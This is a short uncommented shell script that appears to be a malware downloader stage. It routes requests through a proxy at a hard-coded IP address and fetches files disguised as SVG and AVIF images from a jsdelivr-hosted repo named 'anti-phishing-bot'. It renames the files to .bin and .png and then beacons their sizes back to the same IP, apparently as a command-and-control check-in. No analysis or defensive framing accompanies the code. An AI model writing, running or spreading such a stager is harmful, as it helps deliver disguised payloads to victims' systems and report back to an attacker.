#!/bin/sh
A=$1; P=$2; N=$3
D=/tmp/p$P
[ -f $D/lock ] && exit 0; mkdir -p $D; : > $D/lock
if which runuser >/dev/null 2>&1; then if [ "$(id -u)" = 0 ]; then R="runuser -u node --"; else R=""; fi; else R=""; fi
X=http_proxy=http://34.60.89.105:$P; O=no_proxy=127.0.0.1,localhost
B=https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@p493
case "$A" in
IF)
 env $X $O wget -q -t 2 -T 15 -O $D/gdad_proof.svg "$B/gdad_proof.svg"
 env $X $O wget -q -t 2 -T 15 -O $D/glyph.avif "$B/glyph.avif"
 cp $D/gdad_proof.svg $D/gdad_proof.bin; cp $D/glyph.avif $D/glyph.png;;
TRY)
 env $X $O curl -s -m 18 -o $D/gdad_proof.svg "$B/gdad_proof.svg"
 env $X $O curl -s -m 18 -o $D/glyph.avif "$B/glyph.avif"
 cp $D/gdad_proof.svg $D/gdad_proof.bin; cp $D/glyph.avif $D/glyph.png;;
esac
wget -q -T 10 -O /dev/null "http://34.60.89.105:$N/?Z=$A-$P-$N-a$(wc -c <$D/gdad_proof.svg)-b$(wc -c <$D/glyph.avif)"
